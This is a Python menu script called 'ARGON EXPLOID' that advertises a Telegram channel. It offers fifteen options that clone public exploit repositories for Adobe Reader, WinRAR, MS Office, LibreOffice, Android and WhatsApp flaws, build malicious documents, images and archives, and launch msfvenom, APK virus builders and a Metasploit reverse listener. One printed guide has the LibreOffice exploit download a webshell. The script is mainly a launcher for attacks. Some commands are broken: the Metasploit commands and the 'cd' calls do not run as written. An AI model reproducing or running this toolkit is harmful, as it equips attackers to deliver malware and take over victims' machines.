from colorama import Fore
import os
import requests
print(Fore.RED + """

                     A R G O N  E X P L O İ D
          ┈┈┈┈╱▔▔▔▔╲┈┈┈┈
          ┈┈┈▕▕╲┊┊╱▏▏┈┈┈
          ┈┈┈▕▕▂╱╲▂▏▏┈┈┈
          ┈┈┈┈╲┊┊┊┊╱┈┈┈┈
          ┈┈┈┈▕╲▂▂╱▏┈┈┈┈          daha fazlası: t.me/argon_tht 
          ╱▔▔▔▔┊┊┊┊▔▔▔▔╲


          [1]ADOBE READER DC EXPLOIT
          [2]BAT TO PDF WINRAR EXPLOIT
          [3]JAVASCRIPT ADOBE ACROBAT EXPLOIT
          [4]DOC EXPLOIT
          [5]DOC EXPLOIT 2
          [6]MP4 EXPLOIT
          [7]JPG EXPLOIT
          [8]PYTHON CRYPTER
          [9]LINK TO VIRUS
          [10]WHATSAPP GIF EXPLOIT
          [11]LIBREOFFICE EXPLOIT
          [12]EVIL WINRAR 
          [13]ZIP EXPLOIT
          [14]MSFVENOM VIRUS
          [15]APK VIRUS
""")
a = input(">>>")
if a == '1':
	os.system("apt install git")
	os.system("apt install python")
	os.system("git clone https://github.com/infobyte/Exploit-CVE-2021-21086")
	print(Fore.GREEN + "Guide: Generate exploit charstring: python3 .\generate_exploit_charstring.py --output charstring.Embed charstring into a pdf file: python3 .\charstring2pdf.py --filename .\charstring --out exploit.pdf.Open pdf file with Adobe Reader DC.")
if a == '3':
	os.system("apt install nodejs")
	os.system("apt install git")
	os.system("git clone https://github.com/hacksysteam/CVE-2023-21608")
	print("Guide: run crash.js and exploit.js")
if a == '2':
	os.system("git clone https://github.com/b1tg/CVE-2023-38831-winrar-exploit")
	print("""Guide: python cve-2023-38831-exp-gen.py poc
or
python cve-2023-38831-exp-gen.py CLASSIFIED_DOCUMENTS.pdf script.bat  poc.rar""")
if a == '4':
	os.system("git clone https://github.com/klezVirus/CVE-2021-40444")
	print("""Guide: Install

The generator is designed to work on Windows, as it uses the makecab utility. Before usage, be sure to install required dependencies:

With Virtualenv

cd CVE-2021-40444
pip install virtualenv
python -m virtualenv venv venv\Scripts\activate.bat pip install -r requirements 

Without Virtualenv
 cd CVE-2021-40444
 pip install -r requirements 

Usage

The generator is trivial to use, and even if it has been tested with a number of different payloads and Windows versions, it is not fail-proof. I'm encountering different behaviours across different Windows builds. As soon as I have more details to share, I'll post them here.

usage: generator.py [-h] -P PAYLOAD -u URL [-o OUTPUT] [--host] [-c COPY_TO] [-nc] [-t] [%] CVE-2021-40444 - MS Office Word RCE Exploit [%] optional arguments: -h, --help show this help message and exit -P PAYLOAD, --payload PAYLOAD DLL payload to use for the exploit -u URL, --url URL Server URL for malicious references (CAB->INF) -o OUTPUT, --output OUTPUT Output files basename (no extension) --host If set, will host the payload after creation -c COPY_TO, --copy-to COPY_TO Copy payload to an alternate path -nc, --no-cab Use the CAB-less version of the exploit -t, --test Open IExplorer to test the 

""")
	
if a == '5':
	os.system("git clone https://github.com/glowbase/macro_reverse_shell")
	os.system("cd macro_reverse_shell")
	os.system("python generate.py")
if a == '6':
	os.system("git clone https://github.com/eudemonics/stagefright")
	os.system("cd stagefright")
	os.system("python stagefright_exploit.py")
if a == '7':
	os.system("git clone https://github.com/OneSecCyber/JPEG_RCE")
	os.system("cd JPEG_RCE")
	os.system("apt install exiftool")
if a == '8':
	os.system("git clone https://github.com/PushpenderIndia/crypter")
if a == '9':
	print("----Metasploit----")
	ip = input("IP: ")
	os.system("msfconsole")
	os.system("use exploit/android/browser/webview_addjavascriptinterface")
	os.system("set SRVHOST " + ip)
	os.system("set URIPATH /")
	os.system("set LHOST " + ip)
	os.system("set LPORT 4444")
	os.system("set VERBOSE true")
	os.system("set ReverseListenerBindAddress " + ip)
	os.system("run")
	print(ip + "8080")
if a == '10':
	os.system("git clone https://github.com/TinToSer/whatsapp_rce")
if a == '11':
	os.system("git clone https://github.com/elweth-sec/CVE-2023-2255")
	print("Guide: python3 CVE-2023-2255.py --cmd 'wget https://raw.githubusercontent.com/elweth-sec/CVE-2023-2255/main/webshell.php' --output 'exploit.odt'")
if a == '12':
	os.system("git clone https://github.com/manulqwerty/Evil-WinRAR-Gen")
	print("""Guide: git clone https://github.com/manulqwerty/Evil-WinRAR-Gen.git
cd Evil-WinRAR-Gen && pip3 install -r requirements.txt
chmod +x evilWinRAR.py""")
if a == '13':
	os.system("git clone https://github.com/ptoomey3/evilarc")
	print("Guide: zip exploit lets you create a zip file that contains files with directory traversal characters in their embedded path. Most commercial zip program (winzip, etc) will prevent extraction of zip files whose embedded files contain paths with directory traversal characters. However, many software development libraries do not include these same protection mechanisms (ex. Java, PHP, etc). If a program and/or library does not prevent directory traversal characters then evilarc can be used to generate zip files that, once extracted, will place a file at an arbitrary location on the target system.")
if a == '14':
	print("-EXE VIRUS BUILDER-")
	os.system("git clone https://github.com/g0tmi1k/msfpc")
	os.system("cd msfpc")
	os.system("bash msfpc.sh")
if a =='15':
	print("-APK VIRUS BUILDER-")
	os.system("git clone https://github.com/sowmiksudo/GenVirus")
	os.system("cd GenVirus")
	os.system("bash GenVirus.sh")
